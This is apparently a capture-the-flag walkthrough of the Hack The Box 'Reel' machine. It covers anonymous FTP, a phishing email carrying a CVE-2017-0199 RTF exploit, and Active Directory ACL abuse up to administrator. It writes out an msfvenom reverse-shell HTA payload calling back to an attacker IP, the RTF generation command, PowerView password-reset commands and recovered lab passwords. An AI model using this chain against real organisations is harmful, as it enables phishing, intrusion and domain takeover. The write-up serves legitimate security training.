# Reel

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 -Pn 10.129.76.206
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-16 09:29 +08
Nmap scan report for 10.129.76.206
Host is up (0.025s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
25/tcp    open  smtp
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
593/tcp   open  http-rpc-epmap
49159/tcp open  unknown
```

Interesting ports that are open, as both SMTP and FTP are present.&#x20;

### FTP Anonymous Login

This FTP instance allows for anonymous logins:

```
$ ftp 10.129.76.206                 
Connected to 10.129.76.206.
220 Microsoft FTP Service
Name (10.129.76.206:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||41000|)
125 Data connection already open; Transfer starting.
05-29-18  12:19AM       <DIR>          documents
ftp> cd documents
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||41001|)
125 Data connection already open; Transfer starting.
05-29-18  12:19AM                 2047 AppLocker.docx
05-28-18  02:01PM                  124 readme.txt
10-31-17  10:13PM                14581 Windows Event Forwarding.docx
```

We can download all of these files here. The `readme.txt` file tells us that the first step is phishing.

```
$ cat readme.txt           
please email me any rtf format procedures - I'll review and convert.

new format / converted documents will be saved here.
```

The `AppLocker.docx` file just states that AppLocker is in place:

<figure><img src="../../../.gitbook/assets/image (3433).png" alt=""><figcaption></figcaption></figure>

The last file cannot be opened for some reason. The most interesting thing about it is the metadata extracted with `exiftool`:

```
$ exiftool Windows\ Event\ Forwarding.docx 
ExifTool Version Number         : 12.57
File Name                       : Windows Event Forwarding.docx
Directory                       : .
File Size                       : 15 kB
File Modification Date/Time     : 2017:11:01 05:13:23+08:00
File Access Date/Time           : 2023:06:16 09:31:05+08:00
File Inode Change Date/Time     : 2023:06:16 09:31:05+08:00
File Permissions                : -rw-r--r--
File Type                       : DOCX
File Type Extension             : docx
MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
Zip Required Version            : 20
Zip Bit Flag                    : 0x0006
Zip Compression                 : Deflated
Zip Modify Date                 : 1980:01:01 00:00:00
Zip CRC                         : 0x82872409
Zip Compressed Size             : 385
Zip Uncompressed Size           : 1422
Zip File Name                   : [Content_Types].xml
Creator                         : nico@megabank.com
```

We have one email here, and it's likely that we need to send our RTF file to `nico`.&#x20;

### CVE-2017-0199 RTF Exploit

This box is quite old and came out back in 2018, so any public exploits used will have to come from around that time. I googled for 'RTF CVE Exploits', and found quite a few. There was one in 2023, but obviously it isn't the intended attack vector.&#x20;

I came across this article detailing about an RCE exploit in Microsoft Office using RTF files:

{% embed url="https://www.broadcom.com/support/security-center/attacksignatures/detail?asid=30009" %}

Googling for PoCs for this exploit leads me to this somewhat popular repository:

{% embed url="https://github.com/bhdresh/CVE-2017-0199" %}

Following the instructions, we can first generate a payload using `msfvenom`. Earlier, we saw that AppLocker is in place for most executables and scripts, and this exploit allows multiple other methods of getting RCE, such as generating a `hta` file.&#x20;

```
$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.42 lport=443 -f hta-psh > shell.hta
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of hta-psh file: 7263 bytes
```

We can host this file on our own Python HTTP server. Then, generate the RTF file required:

```
$ python2 cve-2017-0199_toolkit.py -M gen -t RTF -w Invoice.rtf -u http://10.10.14.42/shell.hta -x 1
Generating obfuscated RTF file.

Generated obfuscated Invoice.rtf successfull
```

Afterwards, we just need to use `sendEmail` with the file attached.&#x20;

```
$ sendEmail -f user@megabank.com -t nico@megabank.com -u "Invoice" -a Invoice.rtf -s 10.129.76.206
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
  - First line must be received within 60 seconds.
  - End manual input with a CTRL-D on its own line.

hello nico
Jun 16 09:45:50 kali sendEmail[7797]: Message input complete.
Jun 16 09:46:01 kali sendEmail[7797]: Email was sent successfully!
```

I tried this a few times, and it seems to only work when we use the `-x 0` flag instead. When changed, we can get a reverse shell as the user:

<figure><img src="../../../.gitbook/assets/image (1155).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Tom Creds

Within the user's directory, there's a `cred.xml` file present:

```
C:\Users\nico\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is CEBA-B613

 Directory of C:\Users\nico\Desktop

28/05/2018  21:07    <DIR>          .
28/05/2018  21:07    <DIR>          ..
28/10/2017  00:59             1,468 cred.xml
16/06/2023  02:28                34 user.txt
```

When viewed, it contains credentials for the `tom` user:

{% code overflow="wrap" %}
```
C:\Users\nico\Desktop>type cred.xml
type cred.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
    </Props>
  </Obj>
</Objs>
```
{% endcode %}

Since this is a Powershell generated XML file, we can use the `Import-Clixml` cmdlet to decode it.&#x20;

```powershell
C:\Users\nico\Desktop>powershell -c "$credentials = Import-Clixml -Path cred.xml; $credentials.GetNetworkCredential().password"
powershell -c "$credentials = Import-Clixml -Path cred.xml; $credentials.GetNetworkCredential().password"
1ts-mag1c!!!
```

Using this password, we can `ssh` in as `tom`.&#x20;

<figure><img src="../../../.gitbook/assets/image (1277).png" alt=""><figcaption></figcaption></figure>

### Bloodhound --> WriteOwner

The user `tom` is part of multiple AD groups:

```
tom@REEL C:\Users\tom>net user tom                                                           
User name                    tom                                                             
Full Name                    Tom Hanson                                                      
Comment                                                                                      
User's comment                                                                               
Country/region code          000 (System Default)                                            
Account active               Yes                                                             
Account expires              Never                                                           

Password last set            10/28/2017 12:10:42 AM                                          
Password expires             Never                                                           
Password changeable          10/29/2017 12:10:42 AM                                          
Password required            Yes                                                             
User may change password     Yes                                                             

Workstations allowed         All                                                             
Logon script                                                                                 
User profile                                                                                 
Home directory                                                                               
Last logon                   6/16/2023 2:56:58 AM                                            

Logon hours allowed          All                                                             

Local Group Memberships      *Print Operators                                                
Global Group memberships     *Domain Users         *SharePoint_Admins                        
                             *MegaBank_Users       *DR_Site                                  
                             *HelpDesk_Admins      *Restrictions 
```

The desktop also contains some interesting files:

```
tom@REEL C:\Users\tom\Desktop>dir                                                            
 Volume in drive C has no label.                                                             
 Volume Serial Number is CEBA-B613                                                           

 Directory of C:\Users\tom\Desktop                                                           

05/29/2018  08:57 PM    <DIR>          .                                                     
05/29/2018  08:57 PM    <DIR>          ..                                                    
05/29/2018  09:02 PM    <DIR>          AD Audit 

tom@REEL C:\Users\tom\Desktop\AD Audit>type note.txt                                         
Findings:                                                                                    

Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query)
.                                                                                            

Maybe we should re-run Cypher query against other groups we've created. 

tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors>dir                              
 Volume in drive C has no label.                                                             
 Volume Serial Number is CEBA-B613                                                           

 Directory of C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors                             

05/29/2018  08:57 PM    <DIR>          .                                                     
05/29/2018  08:57 PM    <DIR>          ..                                                    
11/17/2017  12:50 AM           112,225 acls.csv                                              
10/28/2017  09:50 PM             3,549 BloodHound.bin                                        
10/24/2017  04:27 PM           246,489 BloodHound_Old.ps1                                    
10/24/2017  04:27 PM           568,832 SharpHound.exe                                        
10/24/2017  04:27 PM           636,959 SharpHound.ps1
```

So there's already a `csv` file present with the ACLs we need. I transferred file back to my machine via `smbserver.py`, and opened it in `libreoffice`. Then, I searched for the user `tom` to see if they had any permissions.

I found that our current user has WriteOwner permissions over the user `claire`.

<figure><img src="../../../.gitbook/assets/image (4037).png" alt=""><figcaption></figcaption></figure>

This would mean that `tom` can add permissions over `claire`, of which we don't have any yet. To abuse this, we first need to set `tom` as the owner of the ACLs over `claire` using PowerView.&#x20;

Oddly, there's a copy of PowerView on the machine already:

```
tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound>dir                                        
 Volume in drive C has no label.                                                             
 Volume Serial Number is CEBA-B613                                                           

 Directory of C:\Users\tom\Desktop\AD Audit\BloodHound                                       

05/30/2018  12:44 AM    <DIR>          .                                                     
05/30/2018  12:44 AM    <DIR>          ..                                                    
06/16/2023  03:09 AM    <DIR>          Ingestors                                             
10/30/2017  11:15 PM           769,587 PowerView.ps1
```

I originally tried copying over my own copy and executing it, but AppLocker kept blocking me. However, using the already present script works. We can then abuse this ACL by setting `tom` as the object owner and changing passwords of `claire`:

```powershell
Set-DomainObjectOwner -Identity claire -OwnerIdentity tom    
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
$cred = ConvertTo-SecureString 'Password@123' -AsPlainText -Force
Set-DomainUserPassword -identity claire -accountpassword $cred                                 
```

Afterwards, we can `ssh` in as `claire` using this password.&#x20;

<figure><img src="../../../.gitbook/assets/image (3812).png" alt=""><figcaption></figcaption></figure>

### WriteDacl --> Admin Creds

The user `claire` is part of another group.

```
claire@REEL C:\Users\claire>net user  claire                                                 
User name                    claire                                                          
Full Name                    Claire Danes                                                    
Comment                                                                                      
User's comment                                                                               
Country/region code          000 (System Default)                                            
Account active               Yes                                                             
Account expires              Never                                                           

Password last set            6/16/2023 3:16:53 AM                                            
Password expires             Never                                                           
Password changeable          6/17/2023 3:16:53 AM                                            
Password required            Yes                                                             
User may change password     Yes                                                             

Workstations allowed         All                                                             
Logon script                                                                                 
User profile                                                                                 
Home directory                                                                               
Last logon                   6/16/2023 3:18:04 AM                                            

Logon hours allowed          All                                                             

Local Group Memberships      *Hyper-V Administrator                                          
Global Group memberships     *Domain Users         *MegaBank_Users                           
                             *DR_Site              *Restrictions
```

Checking back on the Bloodhound output, we see that `claire` has WriteDacl permissions over the Backup Admins group:

<figure><img src="../../../.gitbook/assets/image (360).png" alt=""><figcaption></figcaption></figure>

This means that the user `claire` can modify the ACLs of the group, which includes adding and removing users.&#x20;

```
claire@REEL C:\Users\claire>net group Backup_Admins claire /add /domain                      
The command completed successfully.

claire@REEL C:\Users\claire>net group Backup_Admins                                          
Group name     Backup_Admins                                                                 
Comment                                                                                      

Members                                                                                      

-------------------------------------------------------------------------------              
claire                   ranj                                                                
The command completed successfully. 
```

We can then check the ACLs of the `C:\users\administrator` directory:

```
claire@REEL C:\Users>icacls Administrator                                                    
Administrator NT AUTHORITY\SYSTEM:(OI)(CI)(F)                                                
              HTB\Backup_Admins:(OI)(CI)(F)                                                  
              HTB\Administrator:(OI)(CI)(F)                                                  
              BUILTIN\Administrators:(OI)(CI)(F)                                             

Successfully processed 1 files; Failed processing 0 files
```

We can view the files present in the Desktop, but we cannot read the root flag.

```
claire@REEL C:\Users\Administrator\Desktop>dir                                               
 Volume in drive C has no label.                                                             
 Volume Serial Number is CEBA-B613                                                           

 Directory of C:\Users\Administrator\Desktop                                                 

01/21/2018  03:56 PM    <DIR>          .                                                     
01/21/2018  03:56 PM    <DIR>          ..                                                    
11/02/2017  10:47 PM    <DIR>          Backup Scripts                                        
06/16/2023  02:28 AM                34 root.txt
```

The Backup Scripts folder contains some interesting files, and one contains the admin password:

```
claire@REEL C:\Users\Administrator\Desktop\Backup Scripts>dir                                
 Volume in drive C has no label.                                                             
 Volume Serial Number is CEBA-B613                                                           

 Directory of C:\Users\Administrator\Desktop\Backup Scripts                                  

11/02/2017  10:47 PM    <DIR>          .                                                     
11/02/2017  10:47 PM    <DIR>          ..                                                    
11/04/2017  12:22 AM               845 backup.ps1                                            
11/02/2017  10:37 PM               462 backup1.ps1                                           
11/04/2017  12:21 AM             5,642 BackupScript.ps1                                      
11/02/2017  10:43 PM             2,791 BackupScript.zip                                      
11/04/2017  12:22 AM             1,855 folders-system-state.txt                              
11/04/2017  12:22 AM               308 test2.ps1.txt

claire@REEL C:\Users\Administrator\Desktop\Backup Scripts>type BackupScript.ps1              
# admin password                                                                             
$password="Cr4ckMeIfYouC4n!"
<TRUNCATED>
```

We can then login as the administrator user:

<figure><img src="../../../.gitbook/assets/image (1875).png" alt=""><figcaption></figcaption></figure>

Rooted!&#x20;
